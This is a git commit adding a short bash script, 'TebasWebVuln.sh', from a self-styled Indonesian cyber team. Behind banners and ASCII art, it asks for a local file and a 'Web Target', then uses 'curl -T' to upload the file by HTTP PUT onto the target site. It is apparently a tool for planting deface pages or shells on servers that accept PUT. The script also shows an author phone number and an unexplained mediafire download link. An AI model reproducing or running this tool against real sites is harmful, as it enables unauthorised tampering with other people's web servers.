9be31874bb538d60020de36b45e9a3d854f36403
Berdasi-project67 <51418235+Berdasi-project67@users.noreply.github.com>
2020-05-28 13:50:44 +0800

    Add files via upload
    Tebas

---
+++ TebasWebVuln.sh
@@ -0,0 +1,68 @@
+# usr/bash
+#MauNgapainJink?
+#mauRecode?
+
+#Variables
+b='\033[1m'
+u='\033[4m'
+bl='\E[30m'
+r='\E[31m'
+g='\E[32m'
+bu='\E[34m'
+m='\E[35m'
+c='\E[36m'
+w='\E[37m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+
+figlet -f slant TebasWevVuln | lolcat
+
+echo -e "##################################################" | lolcat
+
+echo -e "++++++++++++++++++++++++++++++++++++++++++++++++++" | lolcat
+echo -e "Author bye : Berdasi" | lolcat
+echo -e "Team       : Berdasi Cyber Team" | lolcat
+echo -e "++++++++++++++++++++++++++++++++++++++++++++++++++" | lolcat
+
+                                                                
+echo "##########################################" |lolcat
+echo "
+             ______________
+              ║▒▒▒▒▒▒▒▒▒▒║
+              ║▒▒▒▒▒▒▒▒▒▒║
+              ║▒▒▒▒▒▒▒▒▒▒║                                                       
+             ╔════════════╗
+             ╚════════════╝             # Tools WebVulnDev
+              ║██████████╚╗
+              ║██╔══╗█╔═╗█║             # Author : Mr.Berdasi
+              ║██║╬╔╝█╚╗║█║             # Team   : Berda Cyber Team
+              ║██╚═╝█║█╚╝█║             # WA     : 087748996836
+              ╚╗█████████═╝             # InstaG : BerdasiCoding
+               ╚╗║╠╩╩╩╩╩╝               #info    : jngn recode anjing
+                ║║┈┈┈█▐█████▒.｡oO       # Dont Recode Please Ya Asw
+                ║██╠╦╦╦╗
+                ╚╗██████
+                 ╚════╝"|lolcat
+
+echo -e "###################################################" | lolcat
+echo -e "Download di sini" | lolcat
+echo -e " untuk pembelajaran" | lolcat
+echo -e "https://www.mediafire.com/download/i7hi1ma94x07tv3"
+echo -e "###################################################" | lolcat
+
+echo
+
+read -p "Masukin $< >> " sc
+read -p "Web Target >> " web
+curl -T /sdcard/$sc $web
+
+
+echo
+echo
+
+echo "Done>> " $web/$sc
+
+echo
